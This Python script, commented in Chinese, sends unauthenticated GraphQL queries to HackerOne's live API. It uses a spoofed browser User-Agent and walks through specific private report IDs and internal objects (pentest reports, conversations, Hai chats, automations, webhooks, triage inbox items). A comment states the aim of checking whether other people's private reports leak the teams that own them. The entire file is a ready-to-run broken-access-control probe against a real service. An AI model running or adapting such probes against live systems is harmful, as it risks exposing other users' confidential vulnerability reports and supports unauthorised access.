# -*- coding: utf-8 -*-
"""h1x53h: 匿名探测新直查入口(assignable_teams/pentest/conversation/hai_chat/hai_task/automation)"""
import sys, io, time
sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8', errors='replace')
import requests, urllib3
urllib3.disable_warnings()
s = requests.Session()
s.headers.update({'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/126.0.0.0 Safari/537.36'})

def probe(name, q, cut=500):
    try:
        r = s.post('https://hackerone.com/graphql', json={'query': q}, timeout=15)
        print('%-46s [%s] %s' % (name, r.status_code, r.text[:cut].replace('\n', ' ')))
    except Exception as e:
        print('%-46s ERR %s' % (name, e))
    time.sleep(0.3)

# 1. assignable_teams: 他人私有报告 id → 是否泄露归属 team
probe('asg_3732660', '''query { assignable_teams(report_ids: [3732660]) { nodes { id name handle } } }''', 400)
probe('asg_2487889', '''query { assignable_teams(report_ids: [2487889]) { nodes { id name handle } } }''', 400)
probe('asg_3992341', '''query { assignable_teams(report_ids: [3992341]) { nodes { id name handle } } }''', 400)

# 2. pentest_report(id: ID) 数字格式采样
probe('pentest_1', '''query { pentest_report(id: "1") { id name report_type } }''')
probe('pentest_500', '''query { pentest_report(id: "500") { id name report_type } }''')
probe('pentest_2487889', '''query { pentest_report(id: "2487889") { id name report_type } }''')

# 3. conversation(id: ID) 数字/字母格式响应
probe('conv_1', '''query { conversation(id: "1") { id type } }''')
probe('conv_3732660', '''query { conversation(id: "3732660") { id type } }''')
probe('conv_gid', '''query { conversation(id: "gid://hackerone/Report/3732660") { id type } }''')

# 4. hai_chat / hai_task / automation / derived_pentest
probe('hai_chat_1', '''query { hai_chat(id: "1") { id } }''')
probe('hai_chat_3732660', '''query { hai_chat(id: "3732660") { id } }''')
probe('hai_task_1', '''query { hai_task(id: "1") { id } }''')
probe('automation_1', '''query { automation(id: 1) { id } }''')
probe('automation_3732660', '''query { automation(id: 3732660) { id } }''')
probe('derived_pentest_r', '''query { derived_pentest(origin_id: "3732660", origin_type: "report") { id } }''')
probe('derived_pentest_p', '''query { derived_pentest(origin_id: "1", origin_type: "pentest") { id } }''')
probe('rom_asset_group_1', '''query { rom_asset_group(id: "1") { id } }''')
probe('webhook_1', '''query { webhook(id: "1") { id } }''')

# 5. triage_inbox_items(report_id) 匿名
probe('tii_r', '''query { triage_inbox_items(report_id: 3732660) { nodes { id } } }''')
